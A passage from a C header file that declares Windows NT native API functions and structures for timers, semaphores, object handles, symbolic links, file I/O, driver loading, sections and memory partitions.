    _Out_writes_bytes_(MutantInformationLength) PVOID MutantInformation,
    _In_ ULONG MutantInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtReleaseMutant(
    _In_ HANDLE MutantHandle,
    _Out_opt_ PLONG PreviousCount);

/************************************************************************************
*
* Timer API.
*
************************************************************************************/

typedef VOID(*PTIMER_APC_ROUTINE) (
    _In_ PVOID TimerContext,
    _In_ ULONG TimerLowValue,
    _In_ LONG TimerHighValue
    );

typedef enum _TIMER_TYPE {
    NotificationTimer,
    SynchronizationTimer
} TIMER_TYPE;

typedef enum _TIMER_INFORMATION_CLASS {
    TimerBasicInformation
} TIMER_INFORMATION_CLASS;

typedef struct _TIMER_BASIC_INFORMATION {
    LARGE_INTEGER RemainingTime;
    BOOLEAN TimerState;
} TIMER_BASIC_INFORMATION, *PTIMER_BASIC_INFORMATION;

typedef enum _TIMER_SET_INFORMATION_CLASS {
    TimerSetCoalescableTimer,
    MaxTimerInfoClass
} TIMER_SET_INFORMATION_CLASS;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateTimer(
    _In_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ TIMER_TYPE TimerType);

NTSYSAPI
NTSTATUS
NTAPI
NtSetTimer(
    _In_ HANDLE TimerHandle,
    _In_ PLARGE_INTEGER DueTime,
    _In_opt_ PTIMER_APC_ROUTINE TimerApcRoutine,
    _In_opt_ PVOID TimerContext,
    _In_ BOOLEAN WakeTimer,
    _In_opt_ LONG Period,
    _Out_opt_ PBOOLEAN PreviousState);

NTSYSAPI
NTSTATUS
NTAPI
NtSetTimerEx(
    _In_ HANDLE TimerHandle,
    _In_ TIMER_SET_INFORMATION_CLASS TimerSetInformationClass,
    _Inout_updates_bytes_opt_(TimerSetInformationLength) PVOID TimerSetInformation,
    _In_ ULONG TimerSetInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenTimer(
    _In_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryTimer(
    _In_ HANDLE TimerHandle,
    _In_ TIMER_INFORMATION_CLASS TimerInformationClass,
    _Out_writes_bytes_(TimerInformationLength) PVOID TimerInformation,
    _In_ ULONG TimerInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCancelTimer(
    _In_ HANDLE TimerHandle,
    _Out_opt_ PBOOLEAN CurrentState);

//ref from ph2

NTSYSAPI
NTSTATUS
NTAPI
NtCreateIRTimer(
    _Out_ PHANDLE TimerHandle,
    _In_ ACCESS_MASK DesiredAccess);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIRTimer(
    _In_ HANDLE TimerHandle,
    _In_opt_ PLARGE_INTEGER DueTime);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateTimer2(
    _Out_ PHANDLE TimerHandle,
    _In_opt_ PVOID Reserved1,
    _In_opt_ PVOID Reserved2,
    _In_ ULONG Attributes,
    _In_ ACCESS_MASK DesiredAccess);

/************************************************************************************
*
* Semaphore API.
*
************************************************************************************/

typedef enum _SEMAPHORE_INFORMATION_CLASS {
    SemaphoreBasicInformation
} SEMAPHORE_INFORMATION_CLASS;

typedef struct _SEMAPHORE_BASIC_INFORMATION {
    LONG CurrentCount;
    LONG MaximumCount;
} SEMAPHORE_BASIC_INFORMATION, *PSEMAPHORE_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateSemaphore(
    _Out_ PHANDLE SemaphoreHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ LONG InitialCount,
    _In_ LONG MaximumCount);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenSemaphore(
    _Out_ PHANDLE SemaphoreHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySemaphore(
    _In_ HANDLE SemaphoreHandle,
    _In_ SEMAPHORE_INFORMATION_CLASS SemaphoreInformationClass,
    _Out_writes_bytes_(SemaphoreInformationLength) PVOID SemaphoreInformation,
    _In_ ULONG SemaphoreInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtReleaseSemaphore(
    _In_ HANDLE SemaphoreHandle,
    _In_ LONG ReleaseCount,
    _Out_opt_ PLONG PreviousCount);

/************************************************************************************
*
* Object and Handle API.
*
************************************************************************************/
typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation,
    ObjectNameInformation,
    ObjectTypeInformation,
    ObjectTypesInformation,
    ObjectHandleFlagInformation,
    ObjectSessionInformation,
    ObjectSessionObjectInformation,
    MaxObjectInfoClass
} OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef struct _OBJECT_BASIC_INFORMATION {
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG Reserved[3];
    ULONG NameInfoSize;
    ULONG TypeInfoSize;
    ULONG SecurityDescriptorSize;
    LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION {
    UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION_V2 {
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    UCHAR TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION_V2, *POBJECT_TYPE_INFORMATION_V2;

typedef struct _OBJECT_TYPES_INFORMATION {
    ULONG NumberOfTypes;
} OBJECT_TYPES_INFORMATION, *POBJECT_TYPES_INFORMATION;

#define OBJECT_TYPES_FIRST_ENTRY(ObjectTypes) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectTypes, ALIGN_UP(sizeof(OBJECT_TYPES_INFORMATION), ULONG_PTR))

#define OBJECT_TYPES_NEXT_ENTRY(ObjectType) (POBJECT_TYPE_INFORMATION)\
    RtlOffsetToPointer(ObjectType, sizeof(OBJECT_TYPE_INFORMATION) + \
    ALIGN_UP(ObjectType->TypeName.MaximumLength, ULONG_PTR))

typedef struct _OBJECT_HANDLE_FLAG_INFORMATION {
    BOOLEAN Inherit;
    BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_FLAG_INFORMATION, *POBJECT_HANDLE_FLAG_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtClose(
    _In_ HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
NtDuplicateObject(
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _In_opt_ HANDLE TargetProcessHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options);

NTSYSAPI
NTSTATUS
NTAPI
NtMakePermanentObject(
    _In_ HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
NtMakeTemporaryObject(
    _In_ HANDLE Handle);

NTSYSAPI
NTSTATUS
NTAPI
NtSetSecurityObject(
    _In_ HANDLE Handle,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySecurityObject(
    _In_ HANDLE Handle,
    _In_ SECURITY_INFORMATION SecurityInformation,
    _Out_writes_bytes_opt_(Length) PSECURITY_DESCRIPTOR SecurityDescriptor,
    _In_ ULONG Length,
    _Out_ PULONG LengthNeeded);

NTSYSAPI
NTSTATUS
NTAPI
NtCompareObjects(
    _In_ HANDLE FirstObjectHandle,
    _In_ HANDLE SecondObjectHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryObject(
    _In_opt_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _Out_writes_bytes_opt_(ObjectInformationLength) PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationObject(
    _In_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _In_reads_bytes_(ObjectInformationLength) PVOID ObjectInformation,
    _In_ ULONG ObjectInformationLength);

typedef enum _WAIT_TYPE {
    WaitAll,
    WaitAny,
    WaitNotification
} WAIT_TYPE;

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForMultipleObjects(
    _In_ ULONG Count,
    _In_reads_(Count) HANDLE Handles[],
    _In_ WAIT_TYPE WaitType,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

/************************************************************************************
*
* Directory Object API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateDirectoryObject(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateDirectoryObjectEx(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ShadowDirectoryHandle,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenDirectoryObject(
    _Out_ PHANDLE DirectoryHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryObject(
    _In_ HANDLE DirectoryHandle,
    _Out_writes_bytes_opt_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_ BOOLEAN RestartScan,
    _Inout_ PULONG Context,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* Private Namespace API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreatePrivateNamespace(
    _Out_ PHANDLE NamespaceHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PVOID BoundaryDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenPrivateNamespace(
    _Out_ PHANDLE NamespaceHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PVOID BoundaryDescriptor);

NTSYSAPI
NTSTATUS
NTAPI
NtDeletePrivateNamespace(
    _In_ HANDLE NamespaceHandle);

/************************************************************************************
*
* Symbolic Link API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateSymbolicLinkObject(
    _Out_ PHANDLE LinkHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ PUNICODE_STRING LinkTarget);

NTSYSAPI
NTSTATUS
WINAPI
NtOpenSymbolicLinkObject(
    _Out_ PHANDLE LinkHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySymbolicLinkObject(
    _In_ HANDLE LinkHandle,
    _Inout_ PUNICODE_STRING LinkTarget,
    _Out_opt_ PULONG  ReturnedLength);

/************************************************************************************
*
* File API (+Driver&HotPatch).
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_opt_ PLARGE_INTEGER AllocationSize,
    _In_ ULONG FileAttributes,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
    _In_ ULONG EaLength);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateNamedPipeFile(
    _Out_ PHANDLE FileHandle,
    _In_ ULONG DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG CreateDisposition,
    _In_ ULONG CreateOptions,
    _In_ ULONG NamedPipeType,
    _In_ ULONG ReadMode,
    _In_ ULONG CompletionMode,
    _In_ ULONG MaximumInstances,
    _In_ ULONG InboundQuota,
    _In_ ULONG OutboundQuota,
    _In_opt_ PLARGE_INTEGER DefaultTimeout);

NTSYSAPI
NTSTATUS
NTAPI
NtCreateMailslotFile(
    _Out_ PHANDLE FileHandle,
    _In_ ULONG DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG CreateOptions,
    _In_ ULONG MailslotQuota,
    _In_ ULONG MaximumMessageSize,
    _In_ PLARGE_INTEGER ReadTimeout);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeviceIoControlFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG IoControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
NtFsControlFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG FsControlCode,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenFile(
    _Out_ PHANDLE FileHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG ShareAccess,
    _In_ ULONG OpenOptions);

NTSYSAPI
NTSTATUS
NTAPI
NtReadFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtLockFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PLARGE_INTEGER ByteOffset,
    _In_ PLARGE_INTEGER Length,
    _In_ ULONG Key,
    _In_ BOOLEAN FailImmediately,
    _In_ BOOLEAN ExclusiveLock);

NTSYSAPI
NTSTATUS
NTAPI
NtUnlockFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PLARGE_INTEGER ByteOffset,
    _In_ PLARGE_INTEGER Length,
    _In_ ULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushBuffersFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
NtDeleteFile(
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryFullAttributesFile(
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _Out_ PFILE_NETWORK_OPEN_INFORMATION FileInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryEaFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_reads_bytes_opt_(EaListLength) PVOID EaList,
    _In_ ULONG EaListLength,
    _In_opt_ PULONG EaIndex,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtSetEaFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_bytecount_(Length) PVOID Buffer,
    _In_ ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryVolumeInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FsInformation,
    _In_ ULONG Length,
    _In_ FS_INFORMATION_CLASS FsInformationClass);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryQuotaInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_reads_bytes_opt_(SidListLength) PVOID SidList,
    _In_ ULONG SidListLength,
    _In_opt_ PSID StartSid,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtSetQuotaInformationFile(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_reads_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length);

NTSYSAPI
NTSTATUS
NTAPI
NtReadFileScatter(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PFILE_SEGMENT_ELEMENT SegmentArray,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteFileGather(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ PFILE_SEGMENT_ELEMENT SegmentArray,
    _In_ ULONG Length,
    _In_opt_ PLARGE_INTEGER ByteOffset,
    _In_opt_ PULONG Key);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan);

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID Buffer,
    _In_ ULONG Length,
    _In_ ULONG CompletionFilter,
    _In_ BOOLEAN WatchTree);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadDriver(
    _In_ PUNICODE_STRING DriverServiceName);

NTSYSAPI
NTSTATUS
NTAPI NtUnloadDriver(
    _In_ PUNICODE_STRING DriverServiceName);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadHotPatch(
    _In_ PUNICODE_STRING HotPatchName,
    _Reserved_ ULONG LoadFlag);

/************************************************************************************
*
* Section API (+MemoryPartitions).
*
************************************************************************************/

typedef enum _MEMORY_PARTITION_INFORMATION_CLASS {
    SystemMemoryPartitionInformation,
    SystemMemoryPartitionMoveMemory,
    SystemMemoryPartitionAddPagefile,
    SystemMemoryPartitionCombineMemory,
    SystemMemoryPartitionInitialAddMemory,
    SystemMemoryPartitionGetMemoryEvents,
    SystemMemoryPartitionMax
} MEMORY_PARTITION_INFORMATION_CLASS;

typedef struct _MEMORY_PARTITION_PAGE_RANGE {
    ULONG_PTR StartPage;
    ULONG_PTR NumberOfPages;
} MEMORY_PARTITION_PAGE_RANGE, *PMEMORY_PARTITION_PAGE_RANGE;

typedef struct _MEMORY_PARTITION_INITIAL_ADD_INFORMATION {
    ULONG Flags;
    ULONG NumberOfRanges;
    ULONG_PTR NumberOfPagesAdded;
    MEMORY_PARTITION_PAGE_RANGE PartitionRanges[1];
} MEMORY_PARTITION_INITIAL_ADD_INFORMATION, *PMEMORY_PARTITION_INITIAL_ADD_INFORMATION;

typedef struct _MEMORY_PARTITION_PAGE_COMBINE_INFORMATION {
    PVOID StopHandle;
    ULONG Flags;
    ULONG_PTR TotalNumberOfPages;
} MEMORY_PARTITION_PAGE_COMBINE_INFORMATION, *PMEMORY_PARTITION_PAGE_COMBINE_INFORMATION;

typedef struct _MEMORY_PARTITION_PAGEFILE_INFORMATION {
    UNICODE_STRING PageFileName;
    LARGE_INTEGER MinimumSize;
    LARGE_INTEGER MaximumSize;
    ULONG Flags;
} MEMORY_PARTITION_PAGEFILE_INFORMATION, *PMEMORY_PARTITION_PAGEFILE_INFORMATION;

typedef struct _MEMORY_PARTITION_TRANSFER_INFORMATION {
    ULONG_PTR NumberOfPages;
    ULONG NumaNode;
    ULONG Flags;
} MEMORY_PARTITION_TRANSFER_INFORMATION, *PMEMORY_PARTITION_TRANSFER_INFORMATION;

typedef struct _MEMORY_PARTITION_CONFIGURATION_INFORMATION {
    ULONG Flags;
    ULONG NumaNode;
    ULONG Channel;
    ULONG NumberOfNumaNodes;
    ULONG_PTR ResidentAvailablePages;
    ULONG_PTR CommittedPages;
    ULONG_PTR CommitLimit;
    ULONG_PTR PeakCommitment;
    ULONG_PTR TotalNumberOfPages;
    ULONG_PTR AvailablePages;
    ULONG_PTR ZeroPages;
    ULONG_PTR FreePages;
    ULONG_PTR StandbyPages;
} MEMORY_PARTITION_CONFIGURATION_INFORMATION, *PMEMORY_PARTITION_CONFIGURATION_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize,
    _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes,
    _In_opt_ HANDLE FileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenSection(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtMapViewOfSection(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_	PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect);

NTSYSAPI
NTSTATUS
NTAPI
NtQuerySection(
    _In_ HANDLE SectionHandle,
    _In_ SECTION_INFORMATION_CLASS SectionInformationClass,
    _Out_ PVOID SectionInformation,
    _In_ SIZE_T SectionInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtUnmapViewOfSection(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress);

NTSYSAPI
NTSTATUS
NTAPI
NtUnmapViewOfSectionEx(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtExtendSection(
    _In_ HANDLE SectionHandle,
    _Inout_ PLARGE_INTEGER NewSectionSize);

NTSYSAPI
NTSTATUS
NTAPI
NtMapUserPhysicalPages(
    _In_ PVOID VirtualAddress,
    _In_ ULONG_PTR NumberOfPages,
    _In_reads_opt_(NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtMapUserPhysicalPagesScatter(
    _In_reads_(NumberOfPages) PVOID *VirtualAddresses,
    _In_ ULONG_PTR NumberOfPages,
    _In_reads_opt_(NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateUserPhysicalPages(
    _In_ HANDLE ProcessHandle,
    _Inout_ PULONG_PTR NumberOfPages,
    _Out_writes_(*NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtFreeUserPhysicalPages(
    _In_ HANDLE ProcessHandle,
    _Inout_ PULONG_PTR NumberOfPages,
    _In_reads_(*NumberOfPages) PULONG_PTR UserPfnArray);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenPartition(
    _Out_ PHANDLE PartitionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSYSAPI
NTSTATUS
NTAPI
NtManagePartition(
    _In_ HANDLE TargetHandle,
    _In_opt_ HANDLE SourceHandle,
